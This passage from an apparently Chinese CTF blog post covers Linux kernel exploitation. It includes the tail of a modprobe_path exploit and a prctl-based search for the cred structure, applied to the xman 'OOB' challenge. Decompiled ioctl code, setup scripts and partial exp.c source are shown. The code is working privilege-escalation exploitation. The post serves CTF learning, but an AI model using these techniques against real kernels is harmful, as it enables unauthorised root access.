'#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' &gt; /tmp/getflag.sh"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /tmp/getflag.sh"</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /tmp/ll"</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/meizijiutql"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">'a'</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    create_slab(fd, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    show(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *modprobe_addr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    create_slab(fd, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(modprobe_addr, <span class="string">'\x00'</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">'\x00'</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">'a'</span>, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input modprobe_addr:"</span>);</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, modprobe_addr, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcat</span>(buf, modprobe_addr);</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">    create_slab(fd, <span class="number">0x400</span>);</span><br><span class="line">    write(fd, <span class="string">"/tmp/getflag.sh\x00"</span>, <span class="number">17</span>);</span><br><span class="line">    create_slab(fd, <span class="number">0x400</span>);</span><br><span class="line">    write(fd, <span class="string">"/tmp/getflag.sh\x00"</span>, <span class="number">17</span>);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="prctl爆破cred地址"><a href="#prctl爆破cred地址" class="headerlink" title="prctl爆破cred地址"></a>prctl爆破cred地址</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p>是p4nda师傅介绍的三种<a href="http://p4nda.top/2018/11/07/stringipc/#EXP" target="_blank" rel="noopener">权限提升思路</a>，第一种也是最简单的思路就是直接修改cred结构体对应标识权限的数据为0，这里用到了一个leak cred地址的方式，首先我们要知道一些基础知识。每个线程在内核中都对应一个线程栈，一个thread_info结构体，这个结构体如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">task</span>;</span>		<span class="comment">/* main task structure */</span></span><br><span class="line">	__u32			flags;		<span class="comment">/* low level flags */</span></span><br><span class="line">	__u32			status;		<span class="comment">/* thread synchronous flags */</span></span><br><span class="line">	__u32			cpu;		<span class="comment">/* current CPU */</span></span><br><span class="line">	<span class="keyword">mm_segment_t</span>		addr_limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sig_on_uaccess_error:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		uaccess_err:<span class="number">1</span>;	<span class="comment">/* uaccess failed */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>在这个结构体中cred结构体用以标识线程的权限，在cred结构体后8字节的位置有一个字符数组<code>char comm[TASK_COMM_LEN];</code>用来表示进程名(<code>不超过16字节</code>)，我们可以用<code>prctl</code>设置它的内容之后用任意读穷举搜索其位置，进而定位到cred地址，之后结合任意写改其内容即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">long</span> state;	<span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">	<span class="keyword">void</span> *<span class="built_in">stack</span>;</span><br><span class="line">	<span class="keyword">atomic_t</span> usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;	<span class="comment">/* per process flags, defined below */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ptrace;</span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">ptracer_cred</span>;</span> <span class="comment">/* Tracer's credentials at attach */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment">					 * credentials (COW) */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>	<span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment">					 * credentials (COW) */</span></span><br><span class="line">	<span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">				     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">				       it with task_lock())</span></span><br><span class="line"><span class="comment">				     - initialized normally by setup_new_exec */</span></span><br><span class="line"><span class="comment">/* file system info */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span> *<span class="title">nameidata</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line"><span class="comment">/* ipc stuff */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span> <span class="title">sysvsem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sysv_shm</span> <span class="title">sysvshm</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">... ... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="xman结营赛-OOB"><a href="#xman结营赛-OOB" class="headerlink" title="xman结营赛 OOB"></a>xman结营赛 OOB</h3><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h4><p>这个题坑还挺多的(还是我太菜了)，启动脚本去掉定时关机，去掉aslr方便调试。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#echo "[+]starting qemu-"</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -append <span class="string">'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr'</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -smp cores=2,threads=4 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null \</span><br><span class="line">    -s</span><br><span class="line"><span class="comment">#echo "[-]boot end"</span></span><br></pre></td></tr></table></figure>
<p>新建一个文件夹把cpio拷进去，执行<code>cpio -dmv &lt; rootfs.cpio</code>解压出文件系统，到./etc/init.d里去改rcS(这里的init脚本为空)，初始脚本里没有挂载<code>/sys</code>目录导致我们没法看更多信息(lsmod可以查看模块.text的加载基址)，可以先拿root起，方便看函数地址等。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/OOB.ko</span><br><span class="line">chmod 644 /dev/OOB</span><br><span class="line">chmod -R 777 /sys/</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/pwn</span><br><span class="line">chown -R root /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chown -R 1000:1000 .</span><br><span class="line"><span class="comment">#chown -R 0:0 .</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line"><span class="comment">#poweroff -f</span></span><br></pre></td></tr></table></figure>
<p>另外进去之后看一眼/dev/OOB的权限会发现普通用户是只读的，我平时<code>open</code>的时候参数习惯为<code>2</code>表示可读写，现在普通用户只能为<code>0</code>，否则文件打开会失败。</p>
<p>OOB.ko里其实只有一个<code>ioctl</code>，里面有四个命令，分别对应<code>Malloc</code>、<code>Free</code>、<code>Write</code>和<code>Read</code>，仔细观察一下我们可以控制<code>idx</code>、<code>user_buf</code>、<code>stack_size</code>和<code>stack_idx</code>而在R/W的时候没有对<code>idx</code>进行检查，虽然他是一个unsigned int的类型，但是我们可以往前任意读，我们Malloc的对象是一个0x100大小的对象，其地址作为obj的addr和0x100存储在bss上，如果bss_list高地址有一些数据满足条件我们就可以任意读了(<code>stack_idx + stack_size &lt;= obj_idx1-&gt;size</code>)这里的stack_idx可以看成addr的offset(单字节)，stack_size为我们想读取的数据大小，其相加小于<code>size</code>，因为我们不能事先在bss上写东西，因此只能往前找满足条件的fake_obj。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">00000000 object          struc ; (sizeof=0x10, align=0x8, copyof_484)</span></span><br><span class="line"><span class="comment">00000000                                         ; XREF: .bss:pool/r</span></span><br><span class="line"><span class="comment">00000000 addr            dq ?                    ; XREF: oob_ioctl+5F/r</span></span><br><span class="line"><span class="comment">00000000                                         ; oob_ioctl+110/r ... ; offset</span></span><br><span class="line"><span class="comment">00000008 size            dq ?</span></span><br><span class="line"><span class="comment">00000010 object          ends</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">oob_ioctl</span><span class="params">(__int64 arg1, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg2, __int64 arg3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> arg22; <span class="comment">// ebx</span></span><br><span class="line">  __int64 arg33; <span class="comment">// rsi</span></span><br><span class="line">  __int64 idx1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *obj_idx1_addr; <span class="comment">// rsi</span></span><br><span class="line">  object *obj_idx1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// r13</span></span><br><span class="line">  object *obj_idx; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">bool</span> obj_addr; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">void</span> *alloc_addr; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// r12</span></span><br><span class="line">  __int64 idx2; <span class="comment">// rax</span></span><br><span class="line">  __int64 addr_idx2; <span class="comment">// rdi</span></span><br><span class="line">  object *v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 idx3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v18; <span class="comment">// rdi</span></span><br><span class="line">  object *v19; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  __int64 user_buf; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line">  __int64 stack_size; <span class="comment">// [rsp+10h] [rbp-28h]</span></span><br><span class="line">  __int64 stack_idx; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  arg22 = arg2;</span><br><span class="line">  arg33 = arg3;</span><br><span class="line">  copy_from_user(&amp;idx, arg3, <span class="number">0x20</span>LL);           <span class="comment">// idx可控</span></span><br><span class="line">  <span class="keyword">if</span> ( arg22 != <span class="number">0x30001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg22 &lt;= <span class="number">0x30001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg22 == <span class="number">0x30000</span> )                   <span class="comment">// 0x30000-&gt;malloc</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9 = user_buf;</span><br><span class="line">        JUMPOUT(*(&amp;obj_num + <span class="number">0x40000000</span>), <span class="number">9</span>, oob_ioctl_cold_0);<span class="comment">// obj_num大于9跳转</span></span><br><span class="line">        obj_idx = &amp;pool[idx];                   <span class="comment">// no check </span></span><br><span class="line">        obj_addr = obj_idx-&gt;addr == <span class="number">0L</span>L;</span><br><span class="line">        obj_idx-&gt;size = <span class="number">0x100</span>LL;</span><br><span class="line">        <span class="keyword">if</span> ( obj_addr )</span><br><span class="line">        &#123;</span><br><span class="line">          alloc_addr = (<span class="keyword">void</span> *)kmem_cache_alloc(kmalloc_caches[<span class="number">8</span>], <span class="number">0x6000C0</span>LL);<span class="comment">// malloc 0x100</span></span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)alloc_addr &gt; <span class="number">0xF</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            obj_idx-&gt;addr = alloc_addr;</span><br><span class="line">            v13 = <span class="number">0L</span>L;</span><br><span class="line">            copy_from_user(alloc_addr, v9, <span class="number">0x100</span>LL);<span class="comment">// copy stack addr to heap</span></span><br><span class="line">            <span class="keyword">return</span> v13;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg22 != <span class="number">0x30002</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( arg22 == <span class="number">0x30003</span> )                 <span class="comment">// 0x30003</span></span><br><span class="line">        &#123;</span><br><span class="line">          idx1 = idx;</span><br><span class="line">          obj_idx1_addr = (<span class="keyword">char</span> *)pool[idx1].addr;</span><br><span class="line">          obj_idx1 = &amp;pool[idx1];               <span class="comment">// idx1无检查</span></span><br><span class="line">          <span class="keyword">if</span> ( obj_idx1_addr )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( stack_idx + stack_size &lt;= obj_idx1-&gt;size )</span><br><span class="line">            &#123;</span><br><span class="line">              copy_to_user(user_buf, &amp;obj_idx1_addr[stack_idx], stack_size);<span class="comment">// arbRead</span></span><br><span class="line">              <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      idx2 = idx;                               <span class="comment">// 0x30002</span></span><br><span class="line">      addr_idx2 = (__int64)pool[idx2].addr;</span><br><span class="line">      v16 = &amp;pool[idx2];</span><br><span class="line">      <span class="keyword">if</span> ( addr_idx2 &amp;&amp; stack_idx + stack_size &lt;= v16-&gt;size )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_from_user(stack_idx + addr_idx2, user_buf, stack_size);<span class="comment">// arbWrite</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  idx3 = idx;                                   <span class="comment">// 0x30001-&gt;free</span></span><br><span class="line">  v18 = pool[idx3].addr;</span><br><span class="line">  v19 = &amp;pool[idx3];</span><br><span class="line">  <span class="keyword">if</span> ( !v18 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  kfree(v18, arg33);</span><br><span class="line">  v19-&gt;addr = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一番努力之后终于找到了满足条件的地方，bss_list地址为<code>0xffffffffa0002420</code>，用这个obj我们可以读取<code>[0x000d00620000002e,0x000d00620000002e+0xffffffffa0002420)</code>范围内的地址的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xffffffffa0003090:     0x000d00620000002e     0xffffffffa0002420</span><br><span class="line">0xffffffffa00030a0:     0x0000000000000500      0x000b006400000033</span><br></pre></td></tr></table></figure>
<p>显然<code>bss_list</code>是满足这个条件的</p>
<p><img src="/2020/09/03/kernel-pwn/1.png" alt="alloc"></p>
<p>尝试多次分配，发现分配12次之后之前的slub缓存就用完了，会用Buddy分配新的一块区域供继续分配，至此我们的思路就有了，分配完这些内存然后<code>fork</code>一个进程，触发创建新的<code>cred</code>对象，这个对象地址一定在<code>0x*17df00</code>和<code>0x*1e3f100</code>之间，我们就可以爆破这块内存区域，寻找我们prctl设置的进程名，进而搜到cred。</p>
<p>下一步用任意地址读读取cred里前0x100的内容，修改前0x28字节为usr_buf。再用任意地址写写到free后的slab的fd，两次Malloc可以得到cred对象，把usr_buf拷贝进去后即可提权成功。</p>
<p><img src="/2020/09/03/kernel-pwn/2.png" alt="root"></p>
<h4 id="exp-c-4"><a href="#exp-c-4" class="headerlink" title="exp.c"></a>exp.c</h4><p>这里还有地方是我没想明白的，就是我以为自己修改的cred是子进程里的，没想到就是本进程的，之前一直在子进程起shell，卡了很久</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MallocCmd  0x30000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FreeCmd    0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WriteCmd   0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ReadCmd    0x30003</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSZ   0x100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> usr_buf[BUFSZ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">attr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125; Attr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">unsigned</span> <span class="keyword">int</span> idx,<span class="keyword">char</span>* ini_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)ini_buf;</span><br><span class="line">    ioctl(fd,MallocCmd,input);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc1</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">unsigned</span> <span class="keyword">int</span> idx,<span class="keyword">size_t</span>* ini_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)ini_buf;</span><br><span class="line">    ioctl(fd,MallocCmd,input);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = idx;</span><br><span class="line">    ioctl(fd,FreeCmd,input);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> obj_idx,<span class="keyword">size_t</span> addr_idx,<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = obj_idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)usr_buf;</span><br><span class="line">    input[<span class="number">2</span>] = size;</span><br><span class="line">    input[<span class="number">3</span>] = addr_idx;</span><br><span class="line">    ioctl(fd,ReadCmd,input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> obj_idx,<span class="keyword">size_t</span> addr_idx,<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = obj_idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)usr_buf;</span><br><span class="line">    input[<span class="number">2</span>] = size;</span><br><span class="line">    input[<span class="number">3</span>] = addr_idx;</span><br><span class="line">    ioctl(fd,WriteCmd,input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LongToStr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> high_4 = addr &gt;&gt; <span 